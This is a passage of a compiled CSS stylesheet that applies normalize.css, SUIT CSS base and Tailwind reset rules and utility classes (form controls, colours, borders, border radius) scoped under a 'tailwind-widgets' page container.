 * Correct the font size and margin on `h1` elements within `section` and
 * `article` contexts in Chrome, Firefox, and Safari.
 */
  /* Grouping content
   ========================================================================== */
  /**
 * 1. Add the correct box sizing in Firefox.
 * 2. Show the overflow in Edge and IE.
 */
  /**
 * 1. Correct the inheritance and scaling of font size in all browsers.
 * 2. Correct the odd `em` font sizing in all browsers.
 */
  /* Text-level semantics
   ========================================================================== */
  /**
 * Remove the gray background on active links in IE 10.
 */
  /**
 * 1. Remove the bottom border in Chrome 57-
 * 2. Add the correct text decoration in Chrome, Edge, IE, Opera, and Safari.
 */
  /**
 * Add the correct font weight in Chrome, Edge, and Safari.
 */
  /**
 * 1. Correct the inheritance and scaling of font size in all browsers.
 * 2. Correct the odd `em` font sizing in all browsers.
 */
  /**
 * Add the correct font size in all browsers.
 */
  /**
 * Prevent `sub` and `sup` elements from affecting the line height in
 * all browsers.
 */
  /* Embedded content
   ========================================================================== */
  /**
 * Remove the border on images inside links in IE 10.
 */
  /* Forms
   ========================================================================== */
  /**
 * 1. Change the font styles in all browsers.
 * 2. Remove the margin in Firefox and Safari.
 */
  /**
 * Show the overflow in IE.
 * 1. Show the overflow in Edge.
 */
  /**
 * Remove the inheritance of text transform in Edge, Firefox, and IE.
 * 1. Remove the inheritance of text transform in Firefox.
 */
  /**
 * Correct the inability to style clickable types in iOS and Safari.
 */
  /**
 * Remove the inner border and padding in Firefox.
 */
  /**
 * Restore the focus styles unset by the previous rule.
 */
  /**
 * Correct the padding in Firefox.
 */
  /**
 * 1. Correct the text wrapping in Edge and IE.
 * 2. Correct the color inheritance from `fieldset` elements in IE.
 * 3. Remove the padding so developers are not caught out when they zero out
 *    `fieldset` elements in all browsers.
 */
  /**
 * Add the correct vertical alignment in Chrome, Firefox, and Opera.
 */
  /**
 * Remove the default vertical scrollbar in IE 10+.
 */
  /**
 * 1. Add the correct box sizing in IE 10.
 * 2. Remove the padding in IE 10.
 */
  /**
 * Correct the cursor style of increment and decrement buttons in Chrome.
 */
  /**
 * 1. Correct the odd appearance in Chrome and Safari.
 * 2. Correct the outline style in Safari.
 */
  /**
 * Remove the inner padding in Chrome and Safari on macOS.
 */
  /**
 * 1. Correct the inability to style clickable types in iOS and Safari.
 * 2. Change font properties to `inherit` in Safari.
 */
  /* Interactive
   ========================================================================== */
  /*
 * Add the correct display in Edge, IE 10+, and Firefox.
 */
  /*
 * Add the correct display in all browsers.
 */
  /* Misc
   ========================================================================== */
  /**
 * Add the correct display in IE 10+.
 */
  /**
 * Add the correct display in IE 10.
 */
  /**
 * Manually forked from SUIT CSS Base: https://github.com/suitcss/base
 * A thin layer on top of normalize.css that provides a starting point more
 * suitable for web applications.
 */
  /**
 * Removes the default spacing and border for appropriate elements.
 */
  /**
 * Work around a Firefox/IE bug where the transparent `button` background
 * results in a loss of the default `button` focus styles.
 */
  /**
 * Tailwind custom reset styles
 */
  /**
 * 1. Use the user's configured `sans` font-family (with Tailwind's default
 *    sans-serif font stack as a fallback) as a sane default.
 * 2. Use Tailwind's default "normal" line-height so the user isn't forced
 *    to override it to ensure consistency even when using the default theme.
 */
  /**
 * 1. Prevent padding and border from affecting element width.
 *
 *    We used to set this in the html element and inherit from
 *    the parent element for everything else. This caused issues
 *    in shadow-dom-enhanced elements like <details> where the content
 *    is wrapped by a div with box-sizing set to `content-box`.
 *
 *    https://github.com/mozdevs/cssremedy/issues/4
 *
 *
 * 2. Allow adding a border to an element by just adding a border-width.
 *
 *    By default, the way the browser specifies that an element should have no
 *    border is by setting it's border-style to `none` in the user-agent
 *    stylesheet.
 *
 *    In order to easily add borders to elements by just setting the `border-width`
 *    property, we change the default border-style for all elements to `solid`, and
 *    use border-width to hide them instead. This way our `border` utilities only
 *    need to set the `border-width` property instead of the entire `border`
 *    shorthand, making our border utilities much more straightforward to compose.
 *
 *    https://github.com/tailwindcss/tailwindcss/pull/116
 */
  /*
 * Ensure horizontal rules are visible by default
 */
  /**
 * Undo the `border-style: none` reset that Normalize applies to images so that
 * our `border-{width}` utilities have the expected effect.
 *
 * The Normalize reset is unnecessary for us since we default the border-width
 * to 0 on all elements.
 *
 * https://github.com/tailwindcss/tailwindcss/issues/362
 */
  /**
 * Reset links to optimize for opt-in styling instead of
 * opt-out.
 */
  /**
 * Reset form element properties that are easy to forget to
 * style explicitly so you don't inadvertently introduce
 * styles that deviate from your design system. These styles
 * supplement a partial reset that is already applied by
 * normalize.css.
 */
  /**
 * Use the configured 'mono' font family for elements that
 * are expected to be rendered with a monospace font, falling
 * back to the system monospace stack if there is no configured
 * 'mono' font family.
 */
  /**
 * Make replaced elements `display: block` by default as that's
 * the behavior you want almost all of the time. Inspired by
 * CSS Remedy, with `svg` added as well.
 *
 * https://github.com/mozdevs/cssremedy/issues/14
 */
  /**
 * Constrain images and videos to the parent width and preserve
 * their instrinsic aspect ratio.
 *
 * https://github.com/mozdevs/cssremedy/issues/14
 */ }
  [page-content] .tailwind-widgets html {
    line-height: 1.15;
    /* 1 */
    -webkit-text-size-adjust: 100%;
    /* 2 */ }
  [page-content] .tailwind-widgets body {
    margin: 0; }
  [page-content] .tailwind-widgets main {
    display: block; }
  [page-content] .tailwind-widgets h1 {
    font-size: 2em;
    margin: 0.67em 0; }
  [page-content] .tailwind-widgets hr {
    -webkit-box-sizing: content-box;
    box-sizing: content-box;
    /* 1 */
    height: 0;
    /* 1 */
    overflow: visible;
    /* 2 */ }
  [page-content] .tailwind-widgets pre {
    font-family: monospace, monospace;
    /* 1 */
    font-size: 1em;
    /* 2 */ }
  [page-content] .tailwind-widgets a {
    background-color: transparent; }
  [page-content] .tailwind-widgets abbr[title] {
    border-bottom: none;
    /* 1 */
    text-decoration: underline;
    /* 2 */
    -webkit-text-decoration: underline dotted;
    text-decoration: underline dotted;
    /* 2 */ }
  [page-content] .tailwind-widgets b,
  [page-content] .tailwind-widgets strong {
    font-weight: bolder; }
  [page-content] .tailwind-widgets code,
  [page-content] .tailwind-widgets kbd,
  [page-content] .tailwind-widgets samp {
    font-family: monospace, monospace;
    /* 1 */
    font-size: 1em;
    /* 2 */ }
  [page-content] .tailwind-widgets small {
    font-size: 80%; }
  [page-content] .tailwind-widgets sub,
  [page-content] .tailwind-widgets sup {
    font-size: 75%;
    line-height: 0;
    position: relative;
    vertical-align: baseline; }
  [page-content] .tailwind-widgets sub {
    bottom: -0.25em; }
  [page-content] .tailwind-widgets sup {
    top: -0.5em; }
  [page-content] .tailwind-widgets img {
    border-style: none; }
  [page-content] .tailwind-widgets button,
  [page-content] .tailwind-widgets input,
  [page-content] .tailwind-widgets optgroup,
  [page-content] .tailwind-widgets select,
  [page-content] .tailwind-widgets textarea {
    font-family: inherit;
    /* 1 */
    font-size: 100%;
    /* 1 */
    line-height: 1.15;
    /* 1 */
    margin: 0;
    /* 2 */ }
  [page-content] .tailwind-widgets button,
  [page-content] .tailwind-widgets input {
    /* 1 */
    overflow: visible; }
  [page-content] .tailwind-widgets button,
  [page-content] .tailwind-widgets select {
    /* 1 */
    text-transform: none; }
  [page-content] .tailwind-widgets button,
  [page-content] .tailwind-widgets [type="button"],
  [page-content] .tailwind-widgets [type="reset"],
  [page-content] .tailwind-widgets [type="submit"] {
    -webkit-appearance: button; }
  [page-content] .tailwind-widgets button::-moz-focus-inner,
  [page-content] .tailwind-widgets [type="button"]::-moz-focus-inner,
  [page-content] .tailwind-widgets [type="reset"]::-moz-focus-inner,
  [page-content] .tailwind-widgets [type="submit"]::-moz-focus-inner {
    border-style: none;
    padding: 0; }
  [page-content] .tailwind-widgets button:-moz-focusring,
  [page-content] .tailwind-widgets [type="button"]:-moz-focusring,
  [page-content] .tailwind-widgets [type="reset"]:-moz-focusring,
  [page-content] .tailwind-widgets [type="submit"]:-moz-focusring {
    outline: 1px dotted ButtonText; }
  [page-content] .tailwind-widgets fieldset {
    padding: 0.35em 0.75em 0.625em; }
  [page-content] .tailwind-widgets legend {
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    /* 1 */
    color: inherit;
    /* 2 */
    display: table;
    /* 1 */
    max-width: 100%;
    /* 1 */
    padding: 0;
    /* 3 */
    white-space: normal;
    /* 1 */ }
  [page-content] .tailwind-widgets progress {
    vertical-align: baseline; }
  [page-content] .tailwind-widgets textarea {
    overflow: auto; }
  [page-content] .tailwind-widgets [type="checkbox"],
  [page-content] .tailwind-widgets [type="radio"] {
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    /* 1 */
    padding: 0;
    /* 2 */ }
  [page-content] .tailwind-widgets [type="number"]::-webkit-inner-spin-button,
  [page-content] .tailwind-widgets [type="number"]::-webkit-outer-spin-button {
    height: auto; }
  [page-content] .tailwind-widgets [type="search"] {
    -webkit-appearance: textfield;
    /* 1 */
    outline-offset: -2px;
    /* 2 */ }
  [page-content] .tailwind-widgets [type="search"]::-webkit-search-decoration {
    -webkit-appearance: none; }
  [page-content] .tailwind-widgets details {
    display: block; }
  [page-content] .tailwind-widgets summary {
    display: list-item; }
  [page-content] .tailwind-widgets template {
    display: none; }
  [page-content] .tailwind-widgets [hidden] {
    display: none; }
  [page-content] .tailwind-widgets blockquote,
  [page-content] .tailwind-widgets dl,
  [page-content] .tailwind-widgets dd,
  [page-content] .tailwind-widgets h1,
  [page-content] .tailwind-widgets h2,
  [page-content] .tailwind-widgets h3,
  [page-content] .tailwind-widgets h4,
  [page-content] .tailwind-widgets h5,
  [page-content] .tailwind-widgets h6,
  [page-content] .tailwind-widgets hr,
  [page-content] .tailwind-widgets figure,
  [page-content] .tailwind-widgets p,
  [page-content] .tailwind-widgets pre {
    margin: 0; }
  [page-content] .tailwind-widgets button {
    background-color: transparent;
    background-image: none; }
  [page-content] .tailwind-widgets button:focus {
    outline: 1px dotted;
    outline: 5px auto -webkit-focus-ring-color; }
  [page-content] .tailwind-widgets fieldset {
    margin: 0;
    padding: 0; }
  [page-content] .tailwind-widgets ol,
  [page-content] .tailwind-widgets ul {
    list-style: none;
    margin: 0;
    padding: 0; }
  [page-content] .tailwind-widgets html {
    font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
    /* 1 */
    line-height: 1.5;
    /* 2 */ }
  [page-content] .tailwind-widgets *,
  [page-content] .tailwind-widgets ::before,
  [page-content] .tailwind-widgets ::after {
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    /* 1 */
    border-width: 0;
    /* 2 */
    border-style: solid;
    /* 2 */
    border-color: #d2d6dc;
    /* 2 */ }
  [page-content] .tailwind-widgets hr {
    border-top-width: 1px; }
  [page-content] .tailwind-widgets img {
    border-style: solid; }
  [page-content] .tailwind-widgets textarea {
    resize: vertical; }
  [page-content] .tailwind-widgets input::-webkit-input-placeholder, [page-content] .tailwind-widgets textarea::-webkit-input-placeholder {
    color: #a0aec0; }
  [page-content] .tailwind-widgets input::-moz-placeholder, [page-content] .tailwind-widgets textarea::-moz-placeholder {
    color: #a0aec0; }
  [page-content] .tailwind-widgets input:-ms-input-placeholder, [page-content] .tailwind-widgets textarea:-ms-input-placeholder {
    color: #a0aec0; }
  [page-content] .tailwind-widgets input::-ms-input-placeholder, [page-content] .tailwind-widgets textarea::-ms-input-placeholder {
    color: #a0aec0; }
  [page-content] .tailwind-widgets input::placeholder,
  [page-content] .tailwind-widgets textarea::placeholder {
    color: #a0aec0; }
  [page-content] .tailwind-widgets button,
  [page-content] .tailwind-widgets [role="button"] {
    cursor: pointer; }
  [page-content] .tailwind-widgets table {
    border-collapse: collapse; }
  [page-content] .tailwind-widgets h1,
  [page-content] .tailwind-widgets h2,
  [page-content] .tailwind-widgets h3,
  [page-content] .tailwind-widgets h4,
  [page-content] .tailwind-widgets h5,
  [page-content] .tailwind-widgets h6 {
    font-size: inherit;
    font-weight: inherit; }
  [page-content] .tailwind-widgets a {
    color: inherit;
    text-decoration: inherit; }
  [page-content] .tailwind-widgets button,
  [page-content] .tailwind-widgets input,
  [page-content] .tailwind-widgets optgroup,
  [page-content] .tailwind-widgets select,
  [page-content] .tailwind-widgets textarea {
    padding: 0;
    line-height: inherit;
    color: inherit; }
  [page-content] .tailwind-widgets pre,
  [page-content] .tailwind-widgets code,
  [page-content] .tailwind-widgets kbd,
  [page-content] .tailwind-widgets samp {
    font-family: Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; }
  [page-content] .tailwind-widgets img,
  [page-content] .tailwind-widgets svg,
  [page-content] .tailwind-widgets video,
  [page-content] .tailwind-widgets canvas,
  [page-content] .tailwind-widgets audio,
  [page-content] .tailwind-widgets iframe,
  [page-content] .tailwind-widgets embed,
  [page-content] .tailwind-widgets object {
    display: block;
    vertical-align: middle; }
  [page-content] .tailwind-widgets img,
  [page-content] .tailwind-widgets video {
    max-width: 100%;
    height: auto; }
  [page-content] .tailwind-widgets .tw-container {
    width: 100%; }
  @media (min-width: 640px) {
    [page-content] .tailwind-widgets .tw-container {
      max-width: 640px; } }
  @media (min-width: 768px) {
    [page-content] .tailwind-widgets .tw-container {
      max-width: 768px; } }
  @media (min-width: 1024px) {
    [page-content] .tailwind-widgets .tw-container {
      max-width: 1024px; } }
  @media (min-width: 1280px) {
    [page-content] .tailwind-widgets .tw-container {
      max-width: 1280px; } }
  [page-content] .tailwind-widgets .tw-form-input {
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
    background-color: #ffffff;
    border-color: #d2d6dc;
    border-width: 1px;
    border-radius: 0.375rem;
    padding-top: 0.5rem;
    padding-right: 0.75rem;
    padding-bottom: 0.5rem;
    padding-left: 0.75rem;
    font-size: 1rem;
    line-height: 1.5; }
  [page-content] .tailwind-widgets .tw-form-input::-webkit-input-placeholder {
    color: #9fa6b2;
    opacity: 1; }
  [page-content] .tailwind-widgets .tw-form-input::-moz-placeholder {
    color: #9fa6b2;
    opacity: 1; }
  [page-content] .tailwind-widgets .tw-form-input:-ms-input-placeholder {
    color: #9fa6b2;
    opacity: 1; }
  [page-content] .tailwind-widgets .tw-form-input::-ms-input-placeholder {
    color: #9fa6b2;
    opacity: 1; }
  [page-content] .tailwind-widgets .tw-form-input::placeholder {
    color: #9fa6b2;
    opacity: 1; }
  [page-content] .tailwind-widgets .tw-form-input:focus {
    outline: none;
    -webkit-box-shadow: 0 0 0 3px rgba(164, 202, 254, 0.45);
    box-shadow: 0 0 0 3px rgba(164, 202, 254, 0.45);
    border-color: #a4cafe; }
  [page-content] .tailwind-widgets .tw-form-select {
    background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 20 20' fill='none'%3e%3cpath d='M7 7l3-3 3 3m0 6l-3 3-3-3' stroke='%239fa6b2' stroke-width='1.5' stroke-linecap='round' stroke-linejoin='round'/%3e%3c/svg%3e");
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
    -webkit-print-color-adjust: exact;
    color-adjust: exact;
    background-repeat: no-repeat;
    background-color: #ffffff;
    border-color: #d2d6dc;
    border-width: 1px;
    border-radius: 0.375rem;
    padding-top: 0.5rem;
    padding-right: 2.5rem;
    padding-bottom: 0.5rem;
    padding-left: 0.75rem;
    font-size: 1rem;
    line-height: 1.5;
    background-position: right 0.5rem center;
    background-size: 1.5em 1.5em; }
  [page-content] .tailwind-widgets .tw-form-select::-ms-expand {
    color: #9fa6b2;
    border: none; }
  @media not print {
    [page-content] .tailwind-widgets .tw-form-select::-ms-expand {
      display: none; } }
  @media print and (-ms-high-contrast: active), print and (-ms-high-contrast: none) {
    [page-content] .tailwind-widgets .tw-form-select {
      padding-right: 0.75rem; } }
  [page-content] .tailwind-widgets .tw-form-select:focus {
    outline: none;
    -webkit-box-shadow: 0 0 0 3px rgba(164, 202, 254, 0.45);
    box-shadow: 0 0 0 3px rgba(164, 202, 254, 0.45);
    border-color: #a4cafe; }
  [page-content] .tailwind-widgets .tw-form-checkbox:checked {
    background-image: url("data:image/svg+xml,%3csvg viewBox='0 0 16 16' fill='white' xmlns='http://www.w3.org/2000/svg'%3e%3cpath d='M5.707 7.293a1 1 0 0 0-1.414 1.414l2 2a1 1 0 0 0 1.414 0l4-4a1 1 0 0 0-1.414-1.414L7 8.586 5.707 7.293z'/%3e%3c/svg%3e");
    border-color: transparent;
    background-color: currentColor;
    background-size: 100% 100%;
    background-position: center;
    background-repeat: no-repeat; }
  @media not print {
    [page-content] .tailwind-widgets .tw-form-checkbox::-ms-check {
      border-width: 1px;
      color: transparent;
      background: inherit;
      border-color: inherit;
      border-radius: inherit; } }
  [page-content] .tailwind-widgets .tw-form-checkbox {
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
    -webkit-print-color-adjust: exact;
    color-adjust: exact;
    display: inline-block;
    vertical-align: middle;
    background-origin: border-box;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    -ms-flex-negative: 0;
    flex-shrink: 0;
    height: 1rem;
    width: 1rem;
    color: #3f83f8;
    background-color: #ffffff;
    border-color: #d2d6dc;
    border-width: 1px;
    border-radius: 0.25rem; }
  [page-content] .tailwind-widgets .tw-form-checkbox:focus {
    outline: none;
    -webkit-box-shadow: 0 0 0 3px rgba(164, 202, 254, 0.45);
    box-shadow: 0 0 0 3px rgba(164, 202, 254, 0.45);
    border-color: #a4cafe; }
  [page-content] .tailwind-widgets .tw-form-checkbox:checked:focus {
    border-color: transparent; }
  [page-content] .tailwind-widgets .tw-form-radio:checked {
    background-image: url("data:image/svg+xml,%3csvg viewBox='0 0 16 16' fill='white' xmlns='http://www.w3.org/2000/svg'%3e%3ccircle cx='8' cy='8' r='3'/%3e%3c/svg%3e");
    border-color: transparent;
    background-color: currentColor;
    background-size: 100% 100%;
    background-position: center;
    background-repeat: no-repeat; }
  @media not print {
    [page-content] .tailwind-widgets .tw-form-radio::-ms-check {
      border-width: 1px;
      color: transparent;
      background: inherit;
      border-color: inherit;
      border-radius: inherit; } }
  [page-content] .tailwind-widgets .tw-form-radio {
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
    -webkit-print-color-adjust: exact;
    color-adjust: exact;
    display: inline-block;
    vertical-align: middle;
    background-origin: border-box;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    -ms-flex-negative: 0;
    flex-shrink: 0;
    border-radius: 100%;
    height: 1rem;
    width: 1rem;
    color: #3f83f8;
    background-color: #ffffff;
    border-color: #d2d6dc;
    border-width: 1px; }
  [page-content] .tailwind-widgets .tw-form-radio:focus {
    outline: none;
    -webkit-box-shadow: 0 0 0 3px rgba(164, 202, 254, 0.45);
    box-shadow: 0 0 0 3px rgba(164, 202, 254, 0.45);
    border-color: #a4cafe; }
  [page-content] .tailwind-widgets .tw-form-radio:checked:focus {
    border-color: transparent; }
  [page-content] .tailwind-widgets .tw-space-x-3 > :not(template) ~ :not(template) {
    --space-x-reverse: 0;
    margin-right: calc(1.2rem * var(--space-x-reverse));
    margin-left: calc(1.2rem * calc(1 - var(--space-x-reverse))); }
  [page-content] .tailwind-widgets .tw-space-x-4 > :not(template) ~ :not(template) {
    --space-x-reverse: 0;
    margin-right: calc(1.6rem * var(--space-x-reverse));
    margin-left: calc(1.6rem * calc(1 - var(--space-x-reverse))); }
  [page-content] .tailwind-widgets .tw-divide-y > :not(template) ~ :not(template) {
    --divide-y-reverse: 0;
    border-top-width: calc(1px * calc(1 - var(--divide-y-reverse)));
    border-bottom-width: calc(1px * var(--divide-y-reverse)); }
  [page-content] .tailwind-widgets .tw-divide-gray-200 > :not(template) ~ :not(template) {
    --divide-opacity: 1;
    border-color: #e5e7eb;
    border-color: rgba(229, 231, 235, var(--divide-opacity)); }
  [page-content] .tailwind-widgets .tw-divide-gray-300 > :not(template) ~ :not(template) {
    --divide-opacity: 1;
    border-color: #d2d6dc;
    border-color: rgba(210, 214, 220, var(--divide-opacity)); }
  [page-content] .tailwind-widgets .tw-sr-only {
    position: absolute;
    width: 1px;
    height: 1px;
    padding: 0;
    margin: -1px;
    overflow: hidden;
    clip: rect(0, 0, 0, 0);
    white-space: nowrap;
    border-width: 0; }
  [page-content] .tailwind-widgets .tw-bg-transparent {
    background-color: transparent; }
  [page-content] .tailwind-widgets .tw-bg-white {
    --bg-opacity: 1;
    background-color: #ffffff;
    background-color: rgba(255, 255, 255, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-gray-50 {
    --bg-opacity: 1;
    background-color: #f9fafb;
    background-color: rgba(249, 250, 251, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-gray-100 {
    --bg-opacity: 1;
    background-color: #f4f5f7;
    background-color: rgba(244, 245, 247, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-gray-200 {
    --bg-opacity: 1;
    background-color: #e5e7eb;
    background-color: rgba(229, 231, 235, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-gray-500 {
    --bg-opacity: 1;
    background-color: #6b7280;
    background-color: rgba(107, 114, 128, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-red-50 {
    --bg-opacity: 1;
    background-color: #fdf2f2;
    background-color: rgba(253, 242, 242, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-red-100 {
    --bg-opacity: 1;
    background-color: #fde8e8;
    background-color: rgba(253, 232, 232, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-orange-100 {
    --bg-opacity: 1;
    background-color: #feecdc;
    background-color: rgba(254, 236, 220, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-yellow-50 {
    --bg-opacity: 1;
    background-color: #fdfdea;
    background-color: rgba(253, 253, 234, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-yellow-100 {
    --bg-opacity: 1;
    background-color: #fdf6b2;
    background-color: rgba(253, 246, 178, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-green-50 {
    --bg-opacity: 1;
    background-color: #f3faf7;
    background-color: rgba(243, 250, 247, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-green-100 {
    --bg-opacity: 1;
    background-color: #def7ec;
    background-color: rgba(222, 247, 236, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-teal-600 {
    --bg-opacity: 1;
    background-color: #047481;
    background-color: rgba(4, 116, 129, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-teal-800 {
    --bg-opacity: 1;
    background-color: #05505c;
    background-color: rgba(5, 80, 92, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-blue-50 {
    --bg-opacity: 1;
    background-color: #ebf5ff;
    background-color: rgba(235, 245, 255, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-blue-100 {
    --bg-opacity: 1;
    background-color: #e1effe;
    background-color: rgba(225, 239, 254, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-blue-600 {
    --bg-opacity: 1;
    background-color: #1c64f2;
    background-color: rgba(28, 100, 242, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-indigo-100 {
    --bg-opacity: 1;
    background-color: #e5edff;
    background-color: rgba(229, 237, 255, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-indigo-500 {
    --bg-opacity: 1;
    background-color: #6875f5;
    background-color: rgba(104, 117, 245, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-indigo-600 {
    --bg-opacity: 1;
    background-color: #5850ec;
    background-color: rgba(88, 80, 236, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-purple-100 {
    --bg-opacity: 1;
    background-color: #edebfe;
    background-color: rgba(237, 235, 254, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-bg-pink-100 {
    --bg-opacity: 1;
    background-color: #fce8f3;
    background-color: rgba(252, 232, 243, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .hover\:tw-bg-gray-50:hover {
    --bg-opacity: 1;
    background-color: #f9fafb;
    background-color: rgba(249, 250, 251, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .hover\:tw-bg-gray-100:hover {
    --bg-opacity: 1;
    background-color: #f4f5f7;
    background-color: rgba(244, 245, 247, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .hover\:tw-bg-gray-200:hover {
    --bg-opacity: 1;
    background-color: #e5e7eb;
    background-color: rgba(229, 231, 235, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .hover\:tw-bg-red-100:hover {
    --bg-opacity: 1;
    background-color: #fde8e8;
    background-color: rgba(253, 232, 232, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .hover\:tw-bg-yellow-100:hover {
    --bg-opacity: 1;
    background-color: #fdf6b2;
    background-color: rgba(253, 246, 178, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .hover\:tw-bg-green-100:hover {
    --bg-opacity: 1;
    background-color: #def7ec;
    background-color: rgba(222, 247, 236, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .hover\:tw-bg-teal-700:hover {
    --bg-opacity: 1;
    background-color: #036672;
    background-color: rgba(3, 102, 114, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .hover\:tw-bg-blue-100:hover {
    --bg-opacity: 1;
    background-color: #e1effe;
    background-color: rgba(225, 239, 254, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .hover\:tw-bg-blue-700:hover {
    --bg-opacity: 1;
    background-color: #1a56db;
    background-color: rgba(26, 86, 219, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .hover\:tw-bg-indigo-700:hover {
    --bg-opacity: 1;
    background-color: #5145cd;
    background-color: rgba(81, 69, 205, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .focus\:tw-bg-gray-50:focus {
    --bg-opacity: 1;
    background-color: #f9fafb;
    background-color: rgba(249, 250, 251, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .focus\:tw-bg-gray-100:focus {
    --bg-opacity: 1;
    background-color: #f4f5f7;
    background-color: rgba(244, 245, 247, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .focus\:tw-bg-red-100:focus {
    --bg-opacity: 1;
    background-color: #fde8e8;
    background-color: rgba(253, 232, 232, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .focus\:tw-bg-yellow-100:focus {
    --bg-opacity: 1;
    background-color: #fdf6b2;
    background-color: rgba(253, 246, 178, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .focus\:tw-bg-green-100:focus {
    --bg-opacity: 1;
    background-color: #def7ec;
    background-color: rgba(222, 247, 236, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .focus\:tw-bg-teal-700:focus {
    --bg-opacity: 1;
    background-color: #036672;
    background-color: rgba(3, 102, 114, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .focus\:tw-bg-blue-100:focus {
    --bg-opacity: 1;
    background-color: #e1effe;
    background-color: rgba(225, 239, 254, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .active\:tw-bg-gray-50:active {
    --bg-opacity: 1;
    background-color: #f9fafb;
    background-color: rgba(249, 250, 251, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .active\:tw-bg-gray-100:active {
    --bg-opacity: 1;
    background-color: #f4f5f7;
    background-color: rgba(244, 245, 247, var(--bg-opacity)); }
  [page-content] .tailwind-widgets .tw-border-transparent {
    border-color: transparent; }
  [page-content] .tailwind-widgets .tw-border-gray-100 {
    --border-opacity: 1;
    border-color: #f4f5f7;
    border-color: rgba(244, 245, 247, var(--border-opacity)); }
  [page-content] .tailwind-widgets .tw-border-gray-200 {
    --border-opacity: 1;
    border-color: #e5e7eb;
    border-color: rgba(229, 231, 235, var(--border-opacity)); }
  [page-content] .tailwind-widgets .tw-border-gray-300 {
    --border-opacity: 1;
    border-color: #d2d6dc;
    border-color: rgba(210, 214, 220, var(--border-opacity)); }
  [page-content] .tailwind-widgets .tw-border-gray-700 {
    --border-opacity: 1;
    border-color: #374151;
    border-color: rgba(55, 65, 81, var(--border-opacity)); }
  [page-content] .tailwind-widgets .tw-border-red-400 {
    --border-opacity: 1;
    border-color: #f98080;
    border-color: rgba(249, 128, 128, var(--border-opacity)); }
  [page-content] .tailwind-widgets .tw-border-yellow-400 {
    --border-opacity: 1;
    border-color: #e3a008;
    border-color: rgba(227, 160, 8, var(--border-opacity)); }
  [page-content] .tailwind-widgets .tw-border-green-400 {
    --border-opacity: 1;
    border-color: #31c48d;
    border-color: rgba(49, 196, 141, var(--border-opacity)); }
  [page-content] .tailwind-widgets .tw-border-teal-800 {
    --border-opacity: 1;
    border-color: #05505c;
    border-color: rgba(5, 80, 92, var(--border-opacity)); }
  [page-content] .tailwind-widgets .tw-border-blue-400 {
    --border-opacity: 1;
    border-color: #76a9fa;
    border-color: rgba(118, 169, 250, var(--border-opacity)); }
  [page-content] .tailwind-widgets .focus\:tw-border-gray-500:focus {
    --border-opacity: 1;
    border-color: #6b7280;
    border-color: rgba(107, 114, 128, var(--border-opacity)); }
  [page-content] .tailwind-widgets .focus\:tw-border-blue-300:focus {
    --border-opacity: 1;
    border-color: #a4cafe;
    border-color: rgba(164, 202, 254, var(--border-opacity)); }
  [page-content] .tailwind-widgets .tw-rounded-sm {
    border-radius: 0.2rem; }
  [page-content] .tailwind-widgets .tw-rounded {
    border-radius: 0.4rem; }
  [page-content] .tailwind-widgets .tw-rounded-md {
    border-radius: 0.6rem; }
  [page-content] .tailwind-widgets .tw-rounded-lg {
    border-radius: 0.8rem; }
  [page-content] .tailwind-widgets .tw-rounded-full {
    border-radius: 9999px; }
  [page-content] .tailwind-widgets .tw-rounded-r-none {
    border-top-right-radius: 0;
    border-bottom-right-radius: 0; }
